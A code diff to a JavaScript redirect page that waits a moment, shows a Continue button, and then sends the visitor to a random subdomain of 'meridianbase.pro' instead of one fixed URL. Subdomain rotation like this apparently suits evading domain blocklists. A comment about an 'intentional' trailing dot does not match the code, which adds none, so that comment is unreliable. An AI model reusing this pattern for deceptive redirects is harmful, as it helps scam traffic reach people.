@@ -117,10 +117,50 @@
    CONFIG
    ============================================================ */
 const CONFIG = {
-  targetUrl: "https://meridian-hub.pro/", // ← destination
+  /* Root domain — a random subdomain is prefixed at redirect time. */
+  rootDomain: "meridianbase.pro",
+
+  /* Optional: how many chars in the random subdomain (4–12 is reasonable). */
+  subdomainLength: 6,
+
+  /* Optional: alphabet. Lowercase + digits keeps DNS-safe characters only. */
+  subdomainAlphabet: "abcdefghijklmnopqrstuvwxyz0123456789",
+
   minDelay: 1500,   // ms — minimum wait before Continue appears
   maxDelay: 2500    // ms — maximum wait
 };
+
+/* ============================================================
+   Random subdomain generator
+   ============================================================ */
+function buildTargetUrl() {
+  const alphabet = CONFIG.subdomainAlphabet || "abcdefghijklmnopqrstuvwxyz0123456789";
+  const length   = Math.max(1, parseInt(CONFIG.subdomainLength, 10) || 6);
+
+  let sub = "";
+
+  // Prefer crypto.getRandomValues when available (unbiased, still sync)
+  try {
+    if (window.crypto && window.crypto.getRandomValues) {
+      const bytes = new Uint8Array(length);
+      window.crypto.getRandomValues(bytes);
+      for (let i = 0; i < length; i++) {
+        sub += alphabet[bytes[i] % alphabet.length];
+      }
+    } else {
+      throw new Error("no crypto");
+    }
+  } catch (e) {
+    // Fallback: Math.random (fine for non-security purposes)
+    for (let i = 0; i < length; i++) {
+      sub += alphabet[Math.floor(Math.random() * alphabet.length)];
+    }
+  }
+
+  // Trailing dot is intentional — ensures only a subdomain, never a collision
+  // with the apex. Browsers normalize it away but resolver treats it as subdomain.
+  return "https://" + sub + "." + CONFIG.rootDomain + "/";
+}
 
 (function () {
   "use strict";
@@ -184,8 +224,11 @@ const CONFIG = {
     $btn.disabled = true;
     $btn.style.opacity = ".6";
     $status.innerHTML = "Redirecting…";
-    try { window.location.replace(CONFIG.targetUrl); }
-    catch (e) { window.location.href = CONFIG.targetUrl; }
+
+    const target = buildTargetUrl();
+
+    try { window.location.replace(target); }
+    catch (e) { window.location.href = target; }
   }
 
   $btn.addEventListener('click', function (e) {
